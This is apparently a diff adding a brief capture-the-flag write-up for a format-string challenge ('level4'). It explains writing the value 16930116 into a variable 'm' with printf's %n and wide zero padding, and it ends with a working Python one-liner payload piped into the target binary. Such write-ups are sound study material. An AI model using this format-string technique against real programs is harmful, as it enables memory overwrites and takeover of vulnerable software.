@@ -1,0 +1,4 @@
+This level is almost the same as the previous level, instead of 64, we need to place the value 16930116 in the var "m".
+This value is very big so we can not print as much as we need only with character, due to limit with fgets.
+We will use the option 0 to print as much 0 to fill the gap and get the 16930116 printed characters.
+python -c 'print "\x10\x98\x04\x08" + "%x"*9 + "%016930060f%n"'> /tmp/lvl4 && cat /tmp/lvl4 | ~/level4
